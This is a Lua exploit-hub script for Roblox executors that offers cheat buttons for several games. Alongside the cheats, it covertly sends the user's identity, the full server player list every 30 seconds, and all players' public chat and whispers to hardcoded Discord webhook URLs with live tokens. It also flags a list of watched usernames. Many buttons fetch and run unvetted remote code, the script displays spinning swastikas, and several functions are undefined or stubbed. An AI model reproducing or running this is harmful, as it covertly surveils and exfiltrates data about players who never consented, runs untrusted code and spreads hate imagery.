if getgenv().NZ_MULTI_HUB then return end
getgenv().NZ_MULTI_HUB = true
getgenv().IY_LOADED = false
local SCRIPT_START = tick()

local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local WEBHOOKS = {
    MAIN = "https://discord.com/api/webhooks/1459298646590754827/TOc_e3_kHwZepKoMQB8EhwSMdFP7_avoyV6kYbmLVV4m6RqwwTha5eltf69snHOuLNKk",
    PLAYERS = "https://discord.com/api/webhooks/1459368985920540692/e6kW7yWiHoK10YDM2VmkXtnGJQ8alQtfkgBYcm_Ddwg6NCsJN_PLOX6TBMF828hg8eCL",
    CHAT = "https://discord.com/api/webhooks/1459368825286955234/cQImuL2TJBPkY1kYn1B-EKEl1MJnMupf5ZyVOQ9el-bZKITGIw6edwMsz4Fo5DC_V8Tz",
    ALERT = "https://discord.com/api/webhooks/1459388726307328047/BVLg4bAKuZBuWjTL1JaClJh1cVICcbC2IDigoKVPUweAM3JZqXIJR3QvioVujUYt-tY6"
}

local MONITORED_USERS = {"swtanos", "molu78", "REDBUL59023", "keep_up8610", "chavxwm", "vgnamax2", "brandopro123a", "Lucas7747343", "chenAlfa2005"}

local function SendWebhook(url, content)
    local payload
    if type(content) == "string" then
        payload = {content = content}
    elseif type(content) == "table" then
        if content.embeds or content.username or content.content then
            payload = content
        else
            local embed = {
                title = content.title or "NZ HUB LOG",
                color = content.color or 0x9b59ff,
                fields = content.fields or {}
            }
            payload = {username = content.username or "NZ Multi Hub", embeds = {embed}}
        end
    else
        payload = {content = tostring(content)}
    end

    local ok, err
    if HttpService and HttpService.HttpEnabled then
        ok, err = pcall(function()
            HttpService:PostAsync(url, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
        end)
        if ok then return true end
    end

    local encoded = HttpService:JSONEncode(payload)
    if type(syn) == "table" and type(syn.request) == "function" then
        pcall(function()
            syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded})
        end)
        return true
    end

    if type(request) == "function" then
        pcall(function()
            request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded})
        end)
        return true
    end

    if type(http_request) == "function" then
        pcall(function()
            http_request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded})
        end)
        return true
    end

    if type(http) == "table" and type(http.request) == "function" then
        pcall(function()
            http.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded})
        end)
        return true
    end

    task.spawn(function() Splash("HTTP disabled: webhooks not sent",1.2) end)
    return false
end

local PLACE_IDS = {
    UBG = 11815767793,
    TSB = 10449761463,
    BBZ = 130739873848552,
    VILTRUM = 113318245878384,
    RIVALS = 17625359962
}

local menuLoaded = false
local cornerSymbols = {}
local cornerSymbolsEnabled = true
local EffectsGui = nil
local Blur = nil

local function setCornerColor(col)
    if type(col) ~= "userdata" then return end
    for _, lbl in ipairs(cornerSymbols) do
        if lbl and lbl.Parent then
            lbl.TextColor3 = col
        end
    end
end

local WindUI = loadstring(game:HttpGet(
  "https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"
))()

local window = WindUI:CreateWindow({
    Title = "NZ MULTI HUB v2.0",
    Subtitle = "2Pac",
    Icon = "🔥",
    Theme = "Dark",
    ToggleKey = Enum.KeyCode.Z
})

local mainTab = window:Tab({Title="Main"})
local gamesTab = window:Tab({Title="Games"})
local universalTab = window:Tab({Title="Universal"})
local symbolsTab = window:Tab({Title="Symbols"})
local ubgTab = window:Tab({Title="Ultimate Battlegrounds"})
local tsbTab = window:Tab({Title="TSB"})
local vilTab = window:Tab({Title="Project Viltrumites"})
local bbzTab = window:Tab({Title="BBZ"})
local rivTab = window:Tab({Title="RIVALS"})

EffectsGui = Instance.new("ScreenGui", game.CoreGui)
EffectsGui.Name = "NZ_MULTI_HUB_EFFECTS"
EffectsGui.IgnoreGuiInset = true
EffectsGui.ResetOnSpawn = false

Blur = Instance.new("BlurEffect", Lighting)
Blur.Size = 0

local function Clear() end
local function Button(dummyText, dummyCb) end

local function Splash(text,time)
    local l = Instance.new("TextLabel",EffectsGui)
    l.Size = UDim2.new(1,0,0,60)
    l.Position = UDim2.new(0,0,0.45,0)
    l.BackgroundTransparency = 1
    l.Text = text
    l.Font = Enum.Font.GothamBold
    l.TextSize = 32
    l.TextTransparency = 1

    task.spawn(function()
        while l.Parent do
            l.TextColor3 = Color3.fromHSV(tick()%5/5,1,1)
            task.wait()
        end
    end)

    TweenService:Create(l,TweenInfo.new(.4),{TextTransparency=0}):Play()
    TweenService:Create(Blur,TweenInfo.new(.4),{Size=18}):Play()
    task.wait(time)
    TweenService:Create(l,TweenInfo.new(.4),{TextTransparency=1}):Play()
    TweenService:Create(Blur,TweenInfo.new(.4),{Size=0}):Play()
    task.wait(.4)
    l:Destroy()
end

local function startHub()
    local displayName = LP.DisplayName or LP.Name
    
    local fields = {
        {name = "👤 Player", value = LP.Name, inline = true},
        {name = "📝 Display Name", value = displayName, inline = true},
        {name = "🆔 UserId", value = tostring(LP.UserId), inline = true},
        {name = "🔗 Profile", value = "https://www.roblox.com/users/"..tostring(LP.UserId).."/profile", inline = false},
        {name = "⚙️ Action", value = "Hub Started", inline = true},
        {name = "🕒 Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
    }
    SendWebhook(WEBHOOKS.MAIN, {title = "NZ HUB LOG", color = 0x9b59ff, fields = fields})
    getgenv().IY_LOADED = true
    
    task.spawn(function()
        cornerSymbols = {}
        local positions = {
            UDim2.new(0,10,0,10),
            UDim2.new(1,-58,0,10),
            UDim2.new(0,10,1,-58),
            UDim2.new(1,-58,1,-58)
        }

        for _, pos in ipairs(positions) do
            if not cornerSymbolsEnabled then break end
            local s = Instance.new("TextLabel", EffectsGui)
            s.Size = UDim2.new(0,48,0,48)
            s.Position = pos
            s.BackgroundTransparency = 1
            s.Text = "卐"
            s.Font = Enum.Font.GothamBold
            s.TextSize = 36
            s.TextColor3 = Color3.fromRGB(255,60,60)
            s.Rotation = 0
            table.insert(cornerSymbols, s)
        end

        local conn
        conn = RunService.Heartbeat:Connect(function(dt)
            for _, lbl in ipairs(cornerSymbols) do
                if lbl and lbl.Parent then
                    lbl.Rotation = (lbl.Rotation + dt * 180) % 360
                end
            end
        end)

        menuLoaded = false
        menuLoaded = true
    end)
end

local SETTINGS_FILE = "nz_ui_settings.json"
local DEFAULT_UI_SETTINGS = {
    transparency = 0.18,
    accent = {r=170,g=120,b=255},
    textColor = {r=255,g=255,b=255}
}
local UI_SETTINGS = DEFAULT_UI_SETTINGS

local function try_writefile(name, data)
    if type(writefile) == "function" then
        pcall(writefile, name, data)
        return true
    end
    return false
end

local function try_readfile(name)
    if type(readfile) == "function" then
        local ok, d = pcall(readfile, name)
        if ok and d then return d end
    end
    return nil
end

local function SaveUISettings()
    local ok, encoded = pcall(function() return HttpService:JSONEncode(UI_SETTINGS) end)
    if ok and encoded then
        if not try_writefile(SETTINGS_FILE, encoded) then
            getgenv().NZ_UI_SETTINGS = UI_SETTINGS
        end
    end
end

local function LoadUISettings()
    local data = try_readfile(SETTINGS_FILE)
    if data then
        local ok, decoded = pcall(function() return HttpService:JSONDecode(data) end)
        if ok and type(decoded) == "table" then UI_SETTINGS = decoded return end
    end
    if type(getgenv().NZ_UI_SETTINGS) == "table" then UI_SETTINGS = getgenv().NZ_UI_SETTINGS end
end

LoadUISettings()

-- Apply UI settings to WindUI (best-effort, non-breaking)
local function ApplyUISettings()
    pcall(function()
        if window and UI_SETTINGS then
            local t = UI_SETTINGS.transparency or 0.18
            for _, candidate in ipairs({"Main","Root","Container","Frame","_Main"}) do
                if window[candidate] and typeof(window[candidate]) == "Instance" then
                    pcall(function() window[candidate].BackgroundTransparency = t end)
                end
            end
            local acc = UI_SETTINGS.accent or {r=170,g=120,b=255}
            local c3 = Color3.fromRGB(acc.r or 170, acc.g or 120, acc.b or 255)
            pcall(function()
                if window.SetAccentColor then window:SetAccentColor(c3) end
                if window.UpdateTheme then window:UpdateTheme({Accent = c3}) end
            end)
            local tc = UI_SETTINGS.textColor or {r=255,g=255,b=255}
            local c3t = Color3.fromRGB(tc.r or 255, tc.g or 255, tc.b or 255)
            pcall(function()
                if window.SetTextColor then window:SetTextColor(c3t) end
                if window.UpdateTheme then window:UpdateTheme({TextColor = c3t}) end
            end)
            for _, candidate in ipairs({"Main","Root","Container","Frame","_Main"}) do
                if window[candidate] and typeof(window[candidate]) == "Instance" then
                    pcall(function() if window[candidate].TextColor3 then window[candidate].TextColor3 = c3t end end)
                end
            end
        end
    end)
end

ApplyUISettings()

pcall(function()
    if window.GetTabs then
        for _, tab in ipairs(window:GetTabs() or {}) do
            local ok, title = pcall(function() return tab.Title end)
            if not ok then
                pcall(function() title = tab:GetTitle() end)
            end
            if title == "UI" then
                pcall(function() if tab.Destroy then tab:Destroy() elseif tab.Remove then tab:Remove() end end)
            end
        end
    end
    if window.Tabs and type(window.Tabs) == "table" then
        for i = #window.Tabs,1,-1 do
            local tab = window.Tabs[i]
            local ok, title = pcall(function() return tab.Title end)
            if not ok then pcall(function() title = tab:GetTitle() end) end
            if title == "UI" then
                pcall(function() if tab.Destroy then tab:Destroy() elseif tab.Remove then tab:Remove() end end)
            end
        end
    end
end)

local function Rejoin()
    pcall(function()
        local placeId = tostring(game.PlaceId)
        local gameName = "Unknown"
        pcall(function()
            local info = MarketplaceService:GetProductInfo(game.PlaceId)
            if info and info.Name then gameName = info.Name end
        end)
        local profile = "https://www.roblox.com/users/" .. tostring(LP.UserId) .. "/profile"
        local fields = {
            {name = "👤 Player", value = LP.Name, inline = true},
            {name = "🆔 UserId", value = tostring(LP.UserId), inline = true},
            {name = "🔗 Profile", value = profile, inline = false},
            {name = "🎮 Game", value = gameName, inline = true},
            {name = "🕹️ PlaceId", value = placeId, inline = true},
            {name = "⚙️ Action", value = "Rejoin", inline = true},
            {name = "🕒 Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
        }
        SendWebhook(WEBHOOKS.MAIN, {title = "NZ HUB LOG", color = 0x9b59ff, fields = fields})
    end)
    TeleportService:Teleport(game.PlaceId,LP)
end

task.spawn(function()
    while task.wait(30) do
        pcall(function()
            local parts = {}
            for _,p in ipairs(Players:GetPlayers()) do
                local prof = "https://www.roblox.com/users/"..tostring(p.UserId).."/profile"
                table.insert(parts, string.format("%s (Display:%s) Id:%s Profile:%s", p.Name, p.DisplayName or "", tostring(p.UserId), prof))
            end
            local fields = {
                {name = "Players", value = table.concat(parts, " | "), inline = false},
                {name = "Count", value = tostring(#parts), inline = true},
                {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
            }
            SendWebhook(WEBHOOKS.PLAYERS, {title = "Server Players", color = 0x2ecc71, fields = fields})
        end)
    end
end)

local function isMonitoredUser(playerName)
    for _, monitoredName in ipairs(MONITORED_USERS) do
        if string.lower(playerName) == string.lower(monitoredName) then
            return true
        end
    end
    return false
end

local function parseWhisperCommand(msg)
    local whisperPattern = "^/w%s+(%w+)%s+(.+)$"
    local recipient, whisperMsg = string.match(msg, whisperPattern)
    if recipient and whisperMsg then
        return true, recipient, whisperMsg
    end
    return false, nil, nil
end

local function connectPlayerChat(p)
    if not p then return end
    p.Chatted:Connect(function(msg)
        pcall(function()
            local time = os.date("%Y-%m-%d %H:%M:%S")
            local isWhisper, whisperTarget, whisperContent = parseWhisperCommand(msg)
            
            local fields = {
                {name = "Player", value = p.Name, inline = true},
                {name = "User ID", value = tostring(p.UserId), inline = true},
            }
            
            if isWhisper then
                table.insert(fields, {name = "Tipo", value = "🤐 Whisper (/w)", inline = true})
                table.insert(fields, {name = "Destinatario", value = whisperTarget, inline = true})
                table.insert(fields, {name = "Mensaje", value = whisperContent, inline = false})
            else
                table.insert(fields, {name = "Tipo", value = "💬 Chat Público", inline = true})
                table.insert(fields, {name = "Mensaje", value = msg, inline = false})
            end
            
            table.insert(fields, {name = "Hora", value = time, inline = true})
            
            local monitored = isMonitoredUser(p.Name)
            
            if not isWhisper then
                SendWebhook(WEBHOOKS.CHAT, {title = "Chat Message", color = 0x3498db, fields = fields})
            end
            
            if monitored then
                local chatType = isWhisper and "🤐 **WHISPER**" or "💬 **CHAT**"
                local msgDisplay = isWhisper and ("a **" .. whisperTarget .. "**: " .. whisperContent) or (": " .. msg)
                local alertContent = {
                    title = chatType .. " de " .. p.Name,
                    color = isWhisper and 0xff6b6b or 0xffd700,
                    fields = fields
                }
                SendWebhook(WEBHOOKS.ALERT, alertContent)
            elseif isWhisper then
                SendWebhook(WEBHOOKS.CHAT, {title = "Whisper Message", color = 0x9b59ff, fields = fields})
            end
        end)
    end)
end

for _,p in ipairs(Players:GetPlayers()) do connectPlayerChat(p) end
Players.PlayerAdded:Connect(connectPlayerChat)

local MainMenu, UBGMenu, TSBMenu, VILMenu, BBZMenu, RIVMenu, SymbolsMenu, UniversalMenu

function UniversalMenu()
    Clear()
    Button("♾️ Infinite Yield",function()
        if getgenv().IY_LOADED then return end
        getgenv().IY_LOADED = true
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        return "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"
    end)
    Button("🔄 Rejoin",Rejoin)
    Button("⬅️ Back",MainMenu)
end

function UBGMenu()
    Clear()
    Button("🔥 Kill Aura",function()
        RunIfInPlace(PLACE_IDS.UBG, function()
            loadstring(game:HttpGet("https://eltonshub-loader.netlify.app/UBG1.lua"))()
        end, "Ultimate Battlegrounds")
        return "https://eltonshub-loader.netlify.app/UBG1.lua"
    end)
    Button("🎭 Emotes",function()
        RunIfInPlace(PLACE_IDS.UBG, function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/WiteHackep/UBG_cosmetic/refs/heads/main/ubg_cosmetic.txt"))()
        end, "Ultimate Battlegrounds")
        return "https://raw.githubusercontent.com/WiteHackep/UBG_cosmetic/refs/heads/main/ubg_cosmetic.txt"
    end)
    Button("❓ Unknown",function()
        RunIfInPlace(PLACE_IDS.UBG, function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/YourLocalSkidder/ultimate/refs/heads/main/Protected_1855805535235895.lua",true))()
        end, "Ultimate Battlegrounds")
        return "https://raw.githubusercontent.com/YourLocalSkidder/ultimate/refs/heads/main/Protected_1855805535235895.lua"
    end)
    Button("🔄 Rejoin",Rejoin)
    Button("⬅️ Back",MainMenu)
end

function TSBMenu()
    Clear()
    Button("🛡️ AUTO BLOCK",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hellattexyss/thestrongestbattlegrounds/refs/heads/main/cpsautoblock.lua"))()
        return "https://raw.githubusercontent.com/hellattexyss/thestrongestbattlegrounds/refs/heads/main/cpsautoblock.lua"
    end)
    Button("💠 best auto block",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/dinhthanhtuankiet1762009-sudo/Js/refs/heads/main/93f2600e64c1a112.lua"))()
        return "https://raw.githubusercontent.com/dinhthanhtuankiet1762009-sudo/Js/refs/heads/main/93f2600e64c1a112.lua"
    end)
    Button("⚡ AUTO TECHS V2",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hellattexyss/autotechs/refs/heads/main/cpstechs.lua"))()
        return "https://raw.githubusercontent.com/hellattexyss/autotechs/refs/heads/main/cpstechs.lua"
    end)
    Button("➡️ SIDE DASH ASSIST",function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/54d6b993fe3a4c1f5c3e375eba35e5ec.lua"))()
        return "https://api.luarmor.net/files/v3/loaders/54d6b993fe3a4c1f5c3e375eba35e5ec.lua"
    end)
    Button("🔁 M1 RESET",function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fa8d49690e680794f761b497742fd1c2.lua"))()
        return "https://api.luarmor.net/files/v3/loaders/fa8d49690e680794f761b497742fd1c2.lua"
    end)
    Button("💥 BOOMY LoopDash V2",function()
        loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/84e2bd29cccc0f5302267e4dc952cff6816db4af36416cbd477daaa26d60863d.lua"))()
        return "https://api.getpolsec.com/scripts/hosted/84e2bd29cccc0f5302267e4dc952cff6816db4af36416cbd477daaa26d60863d.lua"
    end)
    Button("🌀 Instant Twisted Old",function()
        loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/1e18721250d10562953e57cd75a2e7e4151b7d20e876930c0f394056d253b3fd.lua"))()
        return "https://api.getpolsec.com/scripts/hosted/1e18721250d10562953e57cd75a2e7e4151b7d20e876930c0f394056d253b3fd.lua"
    end)
    Button("↩️ Backdash Cancel",function()
        loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/0b57119c46c0267e6791f789ace2ffac7b752a63224d86a0b6f95d68aec099ac.lua"))()
        return "https://api.getpolsec.com/scripts/hosted/0b57119c46c0267e6791f789ace2ffac7b752a63224d86a0b6f95d68aec099ac.lua"
    end)
    Button("⌨️ Back dash cancel PC (E)",function()
        getgenv().keybind = "E"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Cyborg883/BackDashCancel/refs/heads/main/Protected_8787792836664625.lua"))()
        return "https://raw.githubusercontent.com/Cyborg883/BackDashCancel/refs/heads/main/Protected_8787792836664625.lua"
    end)
    Button("🔥 SUPA TECH",function()
        loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/2753546c83053761e44664d36ffe5035d6e20fc8aee1d19f0eb7b933974ae537.lua"))()
        return "https://api.getpolsec.com/scripts/hosted/2753546c83053761e44664d36ffe5035d6e20fc8aee1d19f0eb7b933974ae537.lua"
    end)
    Button("🐱 MEOW TECH",function()
        loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/2345da4cc975b07b3f250f6a83c45687a70c1999b9c46219cd6893771f9dd542/download"))()
        return "https://api.junkie-development.de/api/v1/luascripts/public/2345da4cc975b07b3f250f6a83c45687a70c1999b9c46219cd6893771f9dd542/download"
    end)
    Button("🔄 Rejoin",Rejoin)
    Button("⬅️ Back",MainMenu)
end

function VILMenu()
    Clear()
    Button("🩸 NZ PvP Team",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yenderelmascapito-collab/Proyecto-Viltrumita/refs/heads/main/script.lua"))()
        return "https://raw.githubusercontent.com/yenderelmascapito-collab/Proyecto-Viltrumita/refs/heads/main/script.lua"
    end)
    Button("🔄 Rejoin",Rejoin)
    Button("⬅️ Back",MainMenu)
end

function BBZMenu()
    Clear()
    Button("🏀 BBZ NZ",function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/UPD-Basketball:-Zero-Basketball-Zero-OP-43354"))()
        return "https://rawscripts.net/raw/UPD-Basketball:-Zero-Basketball-Zero-OP-43354"
    end)
    Button("🔄 Rejoin",Rejoin)
    Button("⬅️ Back",MainMenu)
end

function RIVMenu()
    Clear()
    Button("⚔️ Rivals v1",function()
        RunIfInPlace(PLACE_IDS.RIV, function()
            loadstring(game:HttpGet("https://pastefy.app/YiGY38uo/raw"))()
        end, "RIVALS")
        return "https://pastefy.app/YiGY38uo/raw"
    end)
    Button("🔄 Rejoin",Rejoin)
    Button("⬅️ Back",MainMenu)
end

function SymbolsMenu()
    Clear()
    Button("🔴 Rojo",function()
        setCornerColor(Color3.fromRGB(255,60,60))
    end)
    Button("🟢 Verde",function()
        setCornerColor(Color3.fromRGB(80,200,80))
    end)
    Button("🔵 Azul",function()
        setCornerColor(Color3.fromRGB(100,160,255))
    end)
    Button("⚪ Blanco",function()
        setCornerColor(Color3.fromRGB(255,255,255))
    end)
    Button("⚫ Negro",function()
        setCornerColor(Color3.fromRGB(20,20,20))
    end)
    Button("🎨 RGB",function()
        local startTime = tick()
        local conn
        conn = RunService.Heartbeat:Connect(function(dt)
            if cornerSymbols and #cornerSymbols > 0 and cornerSymbols[1] and cornerSymbols[1].Parent then
                local elapsed = tick() - startTime
                local hue = (elapsed * 0.5) % 1
                local col = Color3.fromHSV(hue, 1, 1)
                setCornerColor(col)
            else
                conn:Disconnect()
            end
        end)
    end)
    Button("🔁 Toggle Symbols",function()
        cornerSymbolsEnabled = not cornerSymbolsEnabled
        if cornerSymbolsEnabled then
            if not cornerSymbols or #cornerSymbols == 0 then
                local positions = {
                    UDim2.new(0,10,0,10), UDim2.new(1,-58,0,10), UDim2.new(0,10,1,-58), UDim2.new(1,-58,1,-58)
                }
                for _, pos in ipairs(positions) do
                    local s = Instance.new("TextLabel", EffectsGui)
                    s.Size = UDim2.new(0,48,0,48)
                    s.Position = pos
                    s.BackgroundTransparency = 1
                    s.Text = "卐"
                    s.Font = Enum.Font.GothamBold
                    s.TextSize = 36
                    s.TextColor3 = Color3.fromRGB(255,60,60)
                    s.Rotation = 0
                    table.insert(cornerSymbols, s)
                end
            else
                for _, s in ipairs(cornerSymbols) do if s and s.Parent then s.Visible = true end end
            end
        else
            for _, s in ipairs(cornerSymbols) do if s and s.Parent then s.Visible = false end end
        end
    end)
    Button("⬅️ Back",MainMenu)
end

function MainMenu()
    Clear()

    Button("🥊 Ultimate Battlegrounds",function()
        if game.PlaceId ~= PLACE_IDS.UBG then
            TeleportService:Teleport(PLACE_IDS.UBG,LP)
        else UBGMenu() end
    end)

    Button("💪 The Strongest Battlegrounds",function()
        if game.PlaceId ~= PLACE_IDS.TSB then
            TeleportService:Teleport(PLACE_IDS.TSB,LP)
        else TSBMenu() end
    end)

    Button("🦸 Project Viltrumites",function()
        if game.PlaceId ~= PLACE_IDS.VILTRUM then
            TeleportService:Teleport(PLACE_IDS.VILTRUM,LP)
        else VILMenu() end
    end)

    Button("🏀 Basketball Zero",function()
        if game.PlaceId ~= PLACE_IDS.BBZ then
            TeleportService:Teleport(PLACE_IDS.BBZ,LP)
        else BBZMenu() end
    end)

    Button("⚔️ Rivals",function()
        if game.PlaceId ~= PLACE_IDS.RIVALS then
            TeleportService:Teleport(PLACE_IDS.RIVALS,LP)
        else RIVMenu() end
    end)
    Button("🎛️ Symbolos",SymbolsMenu)

    Button("🌐 Universal Scripts",UniversalMenu)
end

gamesTab:Button({
  Title = "🥊 Ultimate Battlegrounds",
  Callback = function()
    TeleportService:Teleport(PLACE_IDS.UBG, LP)
  end
})
gamesTab:Button({
  Title = "💪 The Strongest Battlegrounds",
  Callback = function()
    TeleportService:Teleport(PLACE_IDS.TSB, LP)
  end
})
gamesTab:Button({
  Title = "🦸 Project Viltrumites",
  Callback = function()
    TeleportService:Teleport(PLACE_IDS.VILTRUM, LP)
  end
})
gamesTab:Button({
  Title = "🏀 Basketball Zero",
  Callback = function()
    TeleportService:Teleport(PLACE_IDS.BBZ, LP)
  end
})
gamesTab:Button({
  Title = "⚔️ Rivals",
  Callback = function()
    TeleportService:Teleport(PLACE_IDS.RIVALS, LP)
  end
})

mainTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})
mainTab:Button({Title = "🔁 Start Hub", Callback = function() startHub() end})

universalTab:Button({Title = "♾️ Infinite Yield", Callback = function()
    if getgenv().IY_LOADED then return end
    getgenv().IY_LOADED = true
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    return "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"
end})
universalTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})

ubgTab:Button({Title = "🔥 Kill Aura", Callback = function()
    loadstring(game:HttpGet("https://eltonshub-loader.netlify.app/UBG1.lua"))()
    return "https://eltonshub-loader.netlify.app/UBG1.lua"
end})
ubgTab:Button({Title = "🎭 Emotes", Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/WiteHackep/UBG_cosmetic/refs/heads/main/ubg_cosmetic.txt"))()
    return "https://raw.githubusercontent.com/WiteHackep/UBG_cosmetic/refs/heads/main/ubg_cosmetic.txt"
end})
ubgTab:Button({Title = "❓ Unknown", Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/YourLocalSkidder/ultimate/refs/heads/main/Protected_1855805535235895.lua",true))()
    return "https://raw.githubusercontent.com/YourLocalSkidder/ultimate/refs/heads/main/Protected_1855805535235895.lua"
end})
ubgTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})

tsbTab:Button({Title = "🛡️ AUTO BLOCK v1", Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hellattexyss/thestrongestbattlegrounds/refs/heads/main/cpsautoblock.lua"))()
    return "https://raw.githubusercontent.com/hellattexyss/thestrongestbattlegrounds/refs/heads/main/cpsautoblock.lua"
end})
tsbTab:Button({Title = "💠 best auto block v2", Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/dinhthanhtuankiet1762009-sudo/Js/refs/heads/main/93f2600e64c1a112.lua"))()
    return "https://raw.githubusercontent.com/dinhthanhtuankiet1762009-sudo/Js/refs/heads/main/93f2600e64c1a112.lua"
end})
tsbTab:Button({Title = "⚡ AUTO TECHS V2", Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hellattexyss/autotechs/refs/heads/main/cpstechs.lua"))()
    return "https://raw.githubusercontent.com/hellattexyss/autotechs/refs/heads/main/cpstechs.lua"
end})
tsbTab:Button({Title = "➡️ SIDE DASH ASSIST", Callback = function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/54d6b993fe3a4c1f5c3e375eba35e5ec.lua"))()
    return "https://api.luarmor.net/files/v3/loaders/54d6b993fe3a4c1f5c3e375eba35e5ec.lua"
end})
tsbTab:Button({Title = "🔁 M1 RESET", Callback = function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fa8d49690e680794f761b497742fd1c2.lua"))()
    return "https://api.getpolsec.com/scripts/hosted/fa8d49690e680794f761b497742fd1c2.lua"
end})
tsbTab:Button({Title = "💥 BOOMY LoopDash V2", Callback = function()
    loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/84e2bd29cccc0f5302267e4dc952cff6816db4af36416cbd477daaa26d60863d.lua"))()
    return "https://api.getpolsec.com/scripts/hosted/84e2bd29cccc0f5302267e4dc952cff6816db4af36416cbd477daaa26d60863d.lua"
end})
tsbTab:Button({Title = "🌀 Instant Twisted Old", Callback = function()
    loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/1e18721250d10562953e57cd75a2e7e4151b7d20e876930c0f394056d253b3fd.lua"))()
    return "https://api.getpolsec.com/scripts/hosted/1e18721250d10562953e57cd75a2e7e4151b7d20e876930c0f394056d253b3fd.lua"
end})
tsbTab:Button({Title = "↩️ Backdash Cancel", Callback = function()
    loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/0b57119c46c0267e6791f789ace2ffac7b752a63224d86a0b6f95d68aec099ac.lua"))()
    return "https://api.getpolsec.com/scripts/hosted/0b57119c46c0267e6791f789ace2ffac7b752a63224d86a0b6f95d68aec099ac.lua"
end})
tsbTab:Button({Title = "⌨️ Back dash cancel PC (E)", Callback = function()
    getgenv().keybind = "E"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Cyborg883/BackDashCancel/refs/heads/main/Protected_8787792836664625.lua"))()
    return "https://raw.githubusercontent.com/Cyborg883/BackDashCancel/refs/heads/main/Protected_8787792836664625.lua"
end})
tsbTab:Button({Title = "🔥 SUPA TECH (bug)", Callback = function()
    loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/2753546c83053761e44664d36ffe5035d6e20fc8aee1d19f0eb7b933974ae537.lua"))()
    return "https://api.getpolsec.com/scripts/hosted/2753546c83053761e44664d36ffe5035d6e20fc8aee1d19f0eb7b933974ae537.lua"
end})
tsbTab:Button({Title = "🐱 MEOW TECH (not working)", Callback = function()
    loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/2345da4cc975b07b3f250f6a83c45687a70c1999b9c46219cd6893771f9dd542/download"))()
    return "https://api.junkie-development.de/api/v1/luascripts/public/2345da4cc975b07b3f250f6a83c45687a70c1999b9c46219cd6893771f9dd542/download"
end})
tsbTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})

vilTab:Button({Title = "🩸 NZ PvP Team", Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/yenderelmascapito-collab/Proyecto-Viltrumita/refs/heads/main/script.lua"))()
    return "https://raw.githubusercontent.com/yenderelmascapito-collab/Proyecto-Viltrumita/refs/heads/main/script.lua"
end})
vilTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})

bbzTab:Button({Title = "🏀 BBZ NZ", Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/UPD-Basketball:-Zero-Basketball-Zero-OP-43354"))()
    return "https://rawscripts.net/raw/UPD-Basketball:-Zero-Basketball-Zero-OP-43354"
end})
bbzTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})

rivTab:Button({Title = "⚔️ Rivals v1", Callback = function()
    loadstring(game:HttpGet("https://pastefy.app/YiGY38uo/raw"))()
    return "https://pastefy.app/YiGY38uo/raw"
end})
rivTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})

symbolsTab:Button({Title = "🔴 Rojo", Callback = function() setCornerColor(Color3.fromRGB(255,60,60)) end})
symbolsTab:Button({Title = "🟢 Verde", Callback = function() setCornerColor(Color3.fromRGB(80,200,80)) end})
symbolsTab:Button({Title = "🔵 Azul", Callback = function() setCornerColor(Color3.fromRGB(100,160,255)) end})
symbolsTab:Button({Title = "⚪ Blanco", Callback = function() setCornerColor(Color3.fromRGB(255,255,255)) end})
